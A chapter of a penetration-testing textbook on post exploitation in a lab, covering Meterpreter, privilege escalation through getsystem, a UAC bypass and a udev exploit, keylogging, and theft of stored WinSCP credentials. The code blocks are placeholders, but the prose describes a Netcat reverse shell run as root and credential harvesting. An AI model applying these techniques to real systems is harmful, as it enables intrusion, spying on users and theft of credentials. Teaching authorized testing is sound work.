- en: Chapter 13. Post Exploitation
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: We’ve gained access to our target systems, so our penetration test is over,
    right? We can tell our client that we got a shell on their systems.
  prefs: []
  type: TYPE_NORMAL
- en: But so what? Why would the client care?
  prefs: []
  type: TYPE_NORMAL
- en: In the post-exploitation phase, we will look at information gathering on the
    exploited systems, privilege escalation, and moving from system to system. Perhaps
    we’ll find that we can access sensitive data stored on the exploited system or
    that we have network access to additional systems that we can use to gain further
    access to company data. Maybe the exploited system is part of a domain, and we
    can use it to access other systems on the domain. These are just a few of the
    potential avenues open to us in post exploitation.
  prefs: []
  type: TYPE_NORMAL
- en: Post exploitation is arguably the most important way to get a clear picture
    of a client’s security posture. For example, in [Chapter 9](ch09.xhtml "Chapter 9. Password
    Attacks"), I mentioned a pentest in which I used access to a decommissioned Windows
    2000 domain controller to gain complete administrative control over a domain.
    If I hadn’t used post-exploitation techniques, I might have instead concluded
    that the Windows 2000 system stored no sensitive information and that it wasn’t
    connected to other systems in a domain. My pentest would not have been nearly
    as successful, and my client wouldn’t have gotten as good of a picture of their
    vulnerabilities, especially when it came to password policies.
  prefs: []
  type: TYPE_NORMAL
- en: This chapter will cover the basics of post exploitation. As you move beyond
    this book and increase your skills as a pentester, you should spend a good deal
    of time on post exploitation. Solid post-exploitation skills differentiate good
    pentesters from the truly great.
  prefs: []
  type: TYPE_NORMAL
- en: Now let’s look at some of our post-exploitation options in Metasploit.
  prefs: []
  type: TYPE_NORMAL
- en: Meterpreter
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: We discussed Meterpreter, Metasploit’s custom payload, in [Chapter 8](ch08.xhtml
    "Chapter 8. Exploitation"). Now let’s dig deeper and look at some of Meterpreter’s
    functionality.
  prefs: []
  type: TYPE_NORMAL
- en: We’ll begin post exploitation by opening a Meterpreter session on each of our
    target systems. As you can see in [Example 13-1](ch13.xhtml#open_metasploit_sessions_on_our_targets
    "Example 13-1. Open Metasploit sessions on our targets"), I have a session on
    the Windows XP target from the MS08-067 exploit. On the Windows 7 target, I used
    a trojan executable like those we used in the previous chapter. On the Linux target,
    I used the TikiWiki PHP vulnerability we exploited in [Chapter 8](ch08.xhtml "Chapter 8. Exploitation").
    You can also log in to the Linux target via SSH using either the password for
    *georgia* we cracked in [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks")
    (password) or the SSH public key we added in [Chapter 8](ch08.xhtml "Chapter 8. Exploitation")
    using the open NFS share.
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-1. Open Metasploit sessions on our targets
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: Start by interacting with your Windows XP session as shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: We’ve already seen a couple of Meterpreter commands throughout the book. Namely,
    in [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"), we used `hashdump` to
    get direct access to local password hashes in on [Offline Password Attacks](ch09.xhtml#offline_password_attacks
    "Offline Password Attacks"). To see a list of available Meterpreter commands,
    enter `help` in the Meterpreter console. For more details about a specific command,
    enter `command -h`.
  prefs: []
  type: TYPE_NORMAL
- en: Using the upload Command
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Perhaps nothing is quite so annoying on a pentest as finding yourself on a Windows
    machine without access to utilities such as `wget` and `curl` to pull down files
    from a web server. In [Chapter 8](ch08.xhtml "Chapter 8. Exploitation"), we saw
    a way to bypass this problem with TFTP, but Meterpreter easily solves the problem
    for us. With a simple command, `help upload`, we can upload files to the target,
    as shown in [Example 13-2](ch13.xhtml#meterpreter_help_command "Example 13-2. Meterpreter
    help command").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-2. Meterpreter help command
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: This help information tells us that we can use `upload` to copy files from our
    Kali system to the Windows XP target.
  prefs: []
  type: TYPE_NORMAL
- en: 'For example, here’s how to upload Netcat for Windows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Remember to escape the backslash characters in the path with a second backslash.
    Also remember that if you upload anything to a target during a pentest or otherwise
    change the target system, record your changes so you can undo them before the
    engagement is over. The last thing you want to do is leave an environment more
    vulnerable than when you found it.
  prefs: []
  type: TYPE_NORMAL
- en: getuid
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Another useful Meterpreter command is `getuid`. This command will tell you the
    name of the *System* user running Meterpreter. Typically, Meterpreter runs with
    the privileges of the exploited process or user.
  prefs: []
  type: TYPE_NORMAL
- en: For example, when we exploit an SMB server with the MS08-067 exploit, we’re
    running on the target with the privileges of the SMB server, namely the Windows
    *System* account, as shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: On the Windows 7 target, we social-engineered the user into running a trojaned
    program that connected back to Metasploit, so Meterpreter is running as the user
    *Georgia Weidman*.
  prefs: []
  type: TYPE_NORMAL
- en: Other Meterpreter Commands
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Before moving on, take some time to work with additional Meterpreter commands.
    You’ll find many useful commands for local information gathering, remote control,
    and even spying on local users, such as keylogging and turning on a webcam from
    a Meterpreter session.
  prefs: []
  type: TYPE_NORMAL
- en: Meterpreter Scripts
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In addition to Meterpreter commands, you can also run Meterpreter scripts from
    a Meterpreter console. The scripts currently available can be found in Kali at
    */usr/share/metasploit-framework/scripts/meterpreter*. These scripts are written
    in Ruby, and you can write your own and submit them for inclusion in the framework.
    To use a Meterpreter script, enter `run` *`<script name>`*. Use the `-h` flag
    to see help information for a script.
  prefs: []
  type: TYPE_NORMAL
- en: When exploiting Internet Explorer in [Chapter 10](ch10.xhtml "Chapter 10. Client-Side
    Exploitation"), we used the `AutoRunScript` option to automatically run the *migrate*
    script to spawn a new process and migrate into it before the browser crashed.
    We can run this script directly inside Meterpreter as well. For example, entering
    **`run migrate -h`**, as shown in [Example 13-3](ch13.xhtml#migrate_script_help_information
    "Example 13-3. Migrate script help information"), gives us information on the
    *migrate* Meterpreter script.
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-3. Migrate script help information
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: Because we’re not racing to beat a session before it closes, we have a few different
    options for which process to migrate to. We can migrate to a process by name using
    the `-n` option. For example, to migrate to the first instance of *explorer.exe*
    that Meterpreter encounters in the process list, we can use `-n explorer.exe`.
  prefs: []
  type: TYPE_NORMAL
- en: You can also migrate to a process by using its process ID (PID) with the `-p`
    option. Use Meterpreter’s `ps` command to see a list of running processes, as
    shown in [Example 13-4](ch13.xhtml#running_process_list "Example 13-4. Running
    process list").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-4. Running process list
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: '*Explorer.exe* is a solid choice. Choose PID `1144` for *explorer.exe*, and
    run the Meterpreter *migrate* script as shown in [Example 13-5](ch13.xhtml#running_the_migrate_script
    "Example 13-5. Running the migrate script").'
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-5. Running the migrate script
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: Meterpreter successfully migrates into the *explorer.exe* process. Now if the
    SMB server happens to become unstable or die, our Meterpreter session is safe.
  prefs: []
  type: TYPE_NORMAL
- en: If you ran the `getuid` command again, you would see that we are no longer running
    as the *System* user but as user *georgia*. This makes sense because this process
    belongs to the logged-in user *georgia*. By moving into this process, we’ve effectively
    dropped our privileges down to user *georgia*.
  prefs: []
  type: TYPE_NORMAL
- en: Let’s stay logged in as user *georgia* on the XP target and look at some ways
    to elevate our privileges to *System* on Windows targets and *root* on the Linux
    target through local privilege-escalation attacks.
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit Post-Exploitation Modules
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: So far we’ve used Metasploit modules for information gathering, vulnerability
    identification, and exploitation. It should come as no surprise that the framework
    has a plethora of useful modules for the post-exploitation phase as well. Metasploit’s
    *post* directory contains modules for local information gathering, remote control,
    privilege escalation, and so on, which span multiple platforms.
  prefs: []
  type: TYPE_NORMAL
- en: For example, consider the module *post/windows/gather/enum_logged_on_users*.
    As shown in [Example 13-6](ch13.xhtml#running_a_metasploit_post_module "Example 13-6. Running
    a Metasploit post module"), this module will show us which users are currently
    logged on to the target system. Put your session in the background (with ctrl-Z
    or `background`) to return to the main Msfconsole prompt.
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-6. Running a Metasploit post module
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: 'We use post modules as we do all Metasploit modules: We set the relevant options,
    and then enter **`exploit`** to run the module. However, in the case of post-exploitation
    modules, instead of setting an `RHOST` or `SRVHOST`, we need to tell Metasploit
    the Session ID we want to run the post-exploitation module against ❶. We then
    run the module against Session 1, the Windows XP target.'
  prefs: []
  type: TYPE_NORMAL
- en: The module returns data telling us the user *georgia* is currently logged in.
    Metasploit automatically saves the output to a file */root/.msf4/loot/20140324121217_default_192.168.20.10_host.users.activ_791806.txt*
    ❷.
  prefs: []
  type: TYPE_NORMAL
- en: Railgun
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Railgun is an extension for Meterpreter that allows direct access to Windows
    APIs. It can be used inside post-exploitation modules for Meterpreter as well
    as the Ruby shell (`irb`) in a Meterpreter session. For example, we can check
    if the session is running as an administrative user by directly accessing the
    `IsUserAnAdmin` function of the *shell32* Windows DLL, as shown here. Be sure
    to bring a session to the foreground with `sessions -i` *`<session id>`* first.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: First, we drop into a Ruby shell with the command `irb`. Note that the `client`
    variable holds the Meterpreter client. Next we enter **`client.railgun.shell32.IsUserAnAdmin`**
    to tell the Ruby interpreter to use Railgun on the current Meterpreter session
    and access the `IsUserAdmin` function of *shell32.dll*. (For additional Railgun
    examples, check out Metasploit post modules such as *windows/gather/reverse_lookup.rb*
    and *windows/manage/download_exec.rb*, which also leverage this functionality.)
    Enter **`exit`** to drop out of the Ruby interpreter and return to Meterpreter.
  prefs: []
  type: TYPE_NORMAL
- en: Local Privilege Escalation
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In the following sections, we’ll explore examples of *local privilege escalation*,
    which involves running exploits to gain additional control of the system after
    exploitation.
  prefs: []
  type: TYPE_NORMAL
- en: Just like network software and client-side software, privileged local processes
    can be subject to exploitable security issues. Some of your attacks may not result
    in gaining the privileges you would like. Gaining command execution through a
    website, compromising a user account without administrative rights, or exploiting
    a listening service with limited privileges can all lead to system access, but
    you may find yourself still working as a limited user. To get the privileges we
    want, we will need to exploit further issues.
  prefs: []
  type: TYPE_NORMAL
- en: getsystem on Windows
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Meterpreter’s `getsystem` command automates trying a series of known local privilege-escalation
    exploits against the target. The command’s options are shown in [Example 13-7](ch13.xhtml#getsystem_help
    "Example 13-7. getsystem help").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-7. `getsystem` help
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: As shown here, running `getsystem` with no arguments will run a series of local
    exploits until one succeeds or all known exploits are exhausted. To run a particular
    exploit, use the `-t` option followed by the exploit number.
  prefs: []
  type: TYPE_NORMAL
- en: Here we run `getsystem` on our Windows XP target with no arguments.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: As you can see, Meterpreter gained system privileges with the first exploit
    it tried. With one command, we are able to elevate our privileges from *georgia*
    to *System*.
  prefs: []
  type: TYPE_NORMAL
- en: Local Escalation Module for Windows
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Local exploit modules in Metasploit allow you to run an exploit on an open session
    to gain additional access. The local privilege-escalation module *exploit/windows/local/ms11_080_afdjoinleaf*
    in [Example 13-8](ch13.xhtml#metasploit_local_exploit "Example 13-8. Metasploit
    local exploit") exploits a (now-patched) flaw in the `Afdjoinleaf` function of
    the *afd.sys* Windows driver. Like post-exploitation modules, use the `SESSION`
    option to denote which open session the exploit should be run against. We’ll run
    the module against our Windows XP session. Unlike post modules, local exploits
    are exploits, so we’ll need to set a payload. If it succeeds, our exploit will
    open a new session with System privileges. In your Windows XP Meterpreter session,
    run the command **`rev2self`** to drop back down to the user *georgia* before
    using this alternative privilege-escalation technique.
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-8. Metasploit local exploit
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: After you enter **`exploit`**, Metasploit runs the exploit in our Windows XP
    session. If it succeeds, you should receive another Meterpreter session. If you
    run `getuid` on this new session, you should see that you’ve once again obtained
    System privileges.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Remember, to succeed, local privilege-escalation attacks rely on a flaw such
    as a missing patch or security misconfiguration. A fully updated and locked-down
    system would not be vulnerable to the MS11-08 exploit because a vendor patch was
    released in 2011.
  prefs: []
  type: TYPE_NORMAL
- en: Bypassing UAC on Windows
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Now let’s see how to escalate our privileges on our more secure Windows 7 target,
    which has additional security features including *user account control (UAC)*.
    Applications running on Windows Vista and higher are limited to using regular
    user privileges. If an application needs to use administrative privileges, an
    administrative user has to approve the elevation. (You’ve probably seen the warning
    notice from UAC when an application wants to make changes.)
  prefs: []
  type: TYPE_NORMAL
- en: Because we gained this session by having user *Georgia Weidman* run a malicious
    binary, the Meterpreter session currently has the privileges of Georgia Weidman.
    Try using `getsystem` against this target, as shown in [Example 13-9](ch13.xhtml#getsystem_fails_on_windows_7
    "Example 13-9. getsystem fails on Windows 7").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-9. `getsystem` fails on Windows 7
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: As you can see, running `getsystem` against this target fails and gives an error
    message. Perhaps this system is fully patched and hardened to the point where
    none of the exploitation techniques in `getsystem` will work.
  prefs: []
  type: TYPE_NORMAL
- en: But as it turns out, our Windows 7 target has not been patched since installation;
    UAC is stopping `getsystem` from working properly.
  prefs: []
  type: TYPE_NORMAL
- en: As with any computer security control, researchers have developed multiple techniques
    to bypass the UAC control. One such technique is included in Metasploit in the
    local exploit *windows/local/bypassuac*. Background the session and run this exploit
    on your Windows 7 session, as shown in [Example 13-10](ch13.xhtml#using_a_module_to_bypass_the_uac_control
    "Example 13-10. Using a module to bypass the UAC control"). Use the exploit module,
    set the `SESSION` option, and so on.
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-10. Using a module to bypass the UAC control
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: The module uses a trusted publisher certificate through process injection to
    bypass the UAC controls. As you can see from the results of the `getui``d` command,
    though our new session is still running as user *Georgia Weidman*, we’re no longer
    restricted by UAC. If it was successful you will again be presented with a new
    session. Don’t worry if you see the line at ❶. As long as the new Meterpreter
    session opens, the attack was successful.
  prefs: []
  type: TYPE_NORMAL
- en: As shown next, having gotten UAC out of the way, `getsystem` has no trouble
    gaining system privileges.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE15]'
  prefs: []
  type: TYPE_PRE
- en: Udev Privilege Escalation on Linux
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: We have yet to try privilege escalation on our Linux target. Let’s mix things
    up a bit and use public exploit code instead of Metasploit to perform a local
    privilege-escalation attack on Linux.
  prefs: []
  type: TYPE_NORMAL
- en: 'We have two ways to interact with our Linux target: via SSH and by using the
    TikiWiki to gain a Meterpreter shell. The Linux Meterpreter has fewer available
    commands than Windows Meterpreter, but in both cases we use the `shell` command
    to drop out of Meterpreter and into a regular command shell, as shown in [Example 13-11](ch13.xhtml#dropping_to_a_shell_in_meterpreter
    "Example 13-11. Dropping to a shell in Meterpreter").'
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-11. Dropping to a shell in Meterpreter
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE16]'
  prefs: []
  type: TYPE_PRE
- en: We see that our TikiWiki exploit gained us a session as the user *www-data*,
    a limited account for the web server, but we have a long way to get to root. We
    have also gained a Bash shell as the user *georgia* through SSH in [Chapter 8](ch08.xhtml
    "Chapter 8. Exploitation") with more privileges than *www-data*, but we’re still
    not the coveted root.
  prefs: []
  type: TYPE_NORMAL
- en: Finding a Vulnerability
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: We need to find a local privilege-escalation vulnerability to exploit. First,
    we need a bit of information about the local system, such as the version of the
    installed kernel and the Ubuntu version. You can find out the Linux kernel version
    with the command `uname -a` and the Ubuntu release version with the command `lsb_release
    -a`, as shown in [Example 13-12](ch13.xhtml#gathering_local_information "Example 13-12. Gathering
    local information").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-12. Gathering local information
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE17]'
  prefs: []
  type: TYPE_PRE
- en: The Linux target is running Linux kernel 2.6.27-2 and Ubuntu 8.10, codename
    *Intrepid*. This Linux system is a bit out of date and is vulnerable to multiple
    known privilege-escalation issues. We’ll focus on an issue in *udev*, the device
    manager for the Linux kernel that is in charge of loading device drivers, or software
    that facilitates control of a device.
  prefs: []
  type: TYPE_NORMAL
- en: Vulnerability CVE-2009-1185 describes an issue in udev where the daemon, which
    runs with root privileges, fails to check whether requests to load drivers originate
    from the kernel. Processes in user space, such as ones that a user starts, can
    send messages to udev and convince it to run code with root privileges.
  prefs: []
  type: TYPE_NORMAL
- en: According to the *SecurityFocus.com* entry for this vulnerability, Ubuntu 8.10
    is an affected platform, and further digging reveals that udev versions 141 and
    earlier are affected by this issue. We can check the udev version on our target
    with the command `udevadm --version`, but we can’t run the command with the privileges
    afforded by *www-data*. Instead, we need to run it from our SSH shell as shown
    here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE18]'
  prefs: []
  type: TYPE_PRE
- en: The udev version on our target, 124, is earlier than 141, which tells us that
    our Linux target is vulnerable.
  prefs: []
  type: TYPE_NORMAL
- en: Finding an Exploit
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: Kali Linux includes a local repository of public exploit code from *Exploitdb.com*
    at */usr/share/exploitdb*, which includes a utility called `searchsploit` that
    we can use to search for useful code. For example, [Example 13-13](ch13.xhtml#searching_the_exploitdb_repository
    "Example 13-13. Searching the Exploitdb repository") shows the results of a search
    for exploits related to udev.
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-13. Searching the Exploitdb repository
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE19]'
  prefs: []
  type: TYPE_PRE
- en: There appear to be multiple public exploits for this issue. Let’s use the second
    exploit, */usr/share/exploitdb/platforms/linux/local/8572.c*.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Always be sure that you fully understand what public exploit code does before
    running it against a target. Additionally, there is always a chance that a public
    exploit won’t run reliably on the target. If possible, set up a lab machine, and
    test the quality of the exploit before you try it on the client target.
  prefs: []
  type: TYPE_NORMAL
- en: One of the great things about this exploit is that it’s well commented and provides
    detailed usage information. [Example 13-14](ch13.xhtml#udev_exploit_usage_information
    "Example 13-14. Udev exploit usage information") shows an excerpt from its C code,
    which includes usage details.
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-14. Udev exploit usage information
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE20]'
  prefs: []
  type: TYPE_PRE
- en: We learn that we need to pass the PID of the udev netlink socket as an argument
    to our exploit. The usage information tells us to look for this value in */proc/net/netlink*,
    usually as udev PID minus 1\. We also see that the exploit will run whatever code
    it finds in the file */tmp/run* as root, so we need to put some code there.
  prefs: []
  type: TYPE_NORMAL
- en: Copying and Compiling the Exploit on the Target
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: First we need to copy the exploit to our target and compile it so that it can
    run. Luckily, the GCC C compiler is preinstalled on most Linux distributions,
    so you can often compile local exploit code directly on the target. To find out
    if GCC is installed, enter **`gcc`** as shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE21]'
  prefs: []
  type: TYPE_PRE
- en: As you can see, GCC complains that it’s not been given any input, but this tells
    us that GCC is present. Now to copy our exploit code to the Linux target. The
    Linux `wget` command lets us use the command line to pull a file down from a web
    server, so let’s copy the C code to our Kali Linux web server as shown here. Make
    sure the apache2 webserver is running in Kali.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE22]'
  prefs: []
  type: TYPE_PRE
- en: Now switch to your SSH shell, and download the file with `wget`, as shown in
    [Example 13-15](ch13.xhtml#using_wget_to_download_a_file "Example 13-15. Using
    wget to download a file").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-15. Using `wget` to download a file
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE23]'
  prefs: []
  type: TYPE_PRE
- en: Now compile the exploit code with GCC on the Linux target as shown here. Use
    the `-o` flag to specify an output file name for your compiled code.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE24]'
  prefs: []
  type: TYPE_PRE
- en: Now to find that udev netlink socket PID mentioned in the exploit’s usage information
    ([Example 13-14](ch13.xhtml#udev_exploit_usage_information "Example 13-14. Udev
    exploit usage information")) for our argument. The usage information noted that
    the PID we need is listed in */proc/net/netlink*. `cat` out the file, as shown
    in [Example 13-16](ch13.xhtml#solidusprocsolidusnetsolidusnetlink_file "Example 13-16. The
    /proc/net/netlink file").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-16. The /proc/net/netlink file
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE25]'
  prefs: []
  type: TYPE_PRE
- en: There’s more than one PID listed, but we know that the PID we need is usually
    the PID of the udev daemon minus 1\. Look at the udev process with the `ps aux`
    command, as shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE26]'
  prefs: []
  type: TYPE_PRE
- en: The udev daemon’s PID is 2469\. One of the PIDs from [Example 13-16](ch13.xhtml#solidusprocsolidusnetsolidusnetlink_file
    "Example 13-16. The /proc/net/netlink file") is 2468 (udev’s PID minus 1). Based
    on the exploit’s help information, this is the value we need. This value is going
    to change between reboots of the Ubuntu target, so make sure you run these commands
    in your own lab to find the correct value.
  prefs: []
  type: TYPE_NORMAL
- en: Adding Code to the /tmp/run File
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: The last thing we need is some code to be run as root in the file */tmp/run*.
    Luckily, we also have Netcat installed on our Ubuntu system by default, so we
    can create a simple Bash script to connect back to a listener on our Kali system,
    as discussed in [Chapter 2](ch02.xhtml "Chapter 2. Using Kali Linux"). Here’s
    the script.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE27]'
  prefs: []
  type: TYPE_PRE
- en: Before running our exploit, we need to set up a listener on our Kali system
    to catch the incoming Netcat shell.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE28]'
  prefs: []
  type: TYPE_PRE
- en: Finally, we’re ready to run our compiled exploit. Remember to pass the PID of
    the udev netlink socket we found earlier as an argument.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE29]'
  prefs: []
  type: TYPE_PRE
- en: Nothing seems to happen on the Linux target, but if you turn back to the Netcat
    listener on Kali, we have a connection. The `whoami` command tells us we now have
    root privileges, as shown in [Example 13-17](ch13.xhtml#gaining_root_privileges
    "Example 13-17. Gaining root privileges").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-17. Gaining root privileges
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE30]'
  prefs: []
  type: TYPE_PRE
- en: We’ve successfully escalated our privileges using a public exploit.
  prefs: []
  type: TYPE_NORMAL
- en: Local Information Gathering
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Once we gain access to a system we should see if any potentially sensitive information
    is present, such as installed software that stores passwords in plaintext or using
    a weak hashing algorithm, proprietary data or source code, customer credit card
    information, or the CEO’s email account. These are all useful bits of information
    to present in the final report to the customer. Additionally, any information
    we find may help us break into other systems in the network that hold even greater
    spoils.
  prefs: []
  type: TYPE_NORMAL
- en: We will look at moving from system to system later in this chapter, but for
    now let’s look at a few interesting ways to find information on the local system.
  prefs: []
  type: TYPE_NORMAL
- en: Searching for Files
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: We can tell Meterpreter to search for interesting files. For example in [Example 13-18](ch13.xhtml#using_meterpreter_to_look_for_files
    "Example 13-18. Using Meterpreter to look for files"), I tell Meterpreter to look
    for any filenames that contain the name *password*.
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-18. Using Meterpreter to look for files
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE31]'
  prefs: []
  type: TYPE_PRE
- en: Keylogging
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Another way to gather information is to let the logged-in user give it to you,
    so to speak. Meterpreter has a keylogger we can use to listen for keystrokes.
    Perhaps the user is logging in to websites or other systems on the network while
    our Meterpreter session is active. Start the keylogger on the Windows XP Meterpreter
    session by entering **`keyscan_start`**, as shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE32]'
  prefs: []
  type: TYPE_PRE
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: You will capture keystrokes only in your current context. For my example, I
    used my original Windows XP session where I am the user *georgia* in the *explorer.exe*
    process, and thus can sniff *georgia*’s keystrokes. Another interesting idea is
    to migrate into the winlogon process, where you will see only login information
    that is typed—certainly useful information.
  prefs: []
  type: TYPE_NORMAL
- en: Now switch to Windows XP, and type something. In my example I typed CTRL-R to
    open the Run dialog. Then I entered `notepad.exe` to start the Notepad program
    and typed `hi georgia` into Notepad.
  prefs: []
  type: TYPE_NORMAL
- en: To see any keystrokes the keylogger has logged, enter **`keyscan_dump`** as
    shown here. As you can see, all of the keystrokes I typed were logged.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE33]'
  prefs: []
  type: TYPE_PRE
- en: To stop the keylogger, enter **`keyscan_stop`** in Meterpreter as shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE34]'
  prefs: []
  type: TYPE_PRE
- en: Gathering Credentials
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: In [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"), we worked with password
    hashes from Windows, Linux, and the FileZilla FTP server, but users may have other
    stored credentials on their local system. Metasploit has several post modules
    for gathering passwords for specific software in */usr/share/metasploit-framework/modules/post/windows/gather/credentials*.
    For our example, we will look at stealing stored credentials from WinSCP, a secure
    copy tool for Windows.
  prefs: []
  type: TYPE_NORMAL
- en: As shown in [Figure 13-1](ch13.xhtml#connecting_with_winscp "Figure 13-1. Connecting
    with WinSCP"), open WinSCP, set the File protocol to **SCP**, the Host name to
    the IP address of the Ubuntu target, and the credentials to *georgia:password*.
    Click **Save As** under the login information.
  prefs: []
  type: TYPE_NORMAL
- en: '![Connecting with WinSCP](httpatomoreillycomsourcenostarchimages2030420.png.jpg)Figure 13-1. Connecting
    with WinSCP'
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Like some of the other tools used in this book, the WinSCP GUI may be updated
    in the future, so your version may not look exactly like this.
  prefs: []
  type: TYPE_NORMAL
- en: You will be prompted for a session name, as shown in [Figure 13-2](ch13.xhtml#saving_credentials_in_winscp
    "Figure 13-2. Saving credentials in WinSCP"). Check the **Save password** box
    before clicking **OK**. Even WinSCP warns you that saving passwords is a bad idea.
  prefs: []
  type: TYPE_NORMAL
- en: '![Saving credentials in WinSCP](httpatomoreillycomsourcenostarchimages2030422.png.jpg)Figure 13-2. Saving
    credentials in WinSCP'
  prefs: []
  type: TYPE_NORMAL
- en: Now switch back to Kali Linux, and use the module *post/windows/gather/credentials/winscp*,
    as shown in [Example 13-19](ch13.xhtml#stealing_stored_credentials_from_winscp
    "Example 13-19. Stealing stored credentials from WinSCP"). Because this is a post
    module, the only option you will need to supply is the ID of the Windows XP session.
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-19. Stealing stored credentials from WinSCP
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE35]'
  prefs: []
  type: TYPE_PRE
- en: As shown in [Example 13-19](ch13.xhtml#stealing_stored_credentials_from_winscp
    "Example 13-19. Stealing stored credentials from WinSCP"), the module discovers
    our saved credentials ❶. Based on the software your pentesting targets are running,
    there may be other credential-gathering targets that will come in handy in the
    field.
  prefs: []
  type: TYPE_NORMAL
- en: net Commands
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: The Windows `net` command will allow us to view and edit network information.
    Using various options, we can gain valuable information. Drop to a Windows command
    shell using the Meterpreter command shell, as shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE36]'
  prefs: []
  type: TYPE_PRE
- en: The command `net users` will show us all local users. Tacking on the word `/domain`
    at the end of this and many `net` commands will show information about the domain
    rather than the local system, but because our targets are not joined to a domain,
    we’ll stick with `net users`.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE37]'
  prefs: []
  type: TYPE_PRE
- en: We can also see the members of a group with the command `net` `localgroup` *`group`*
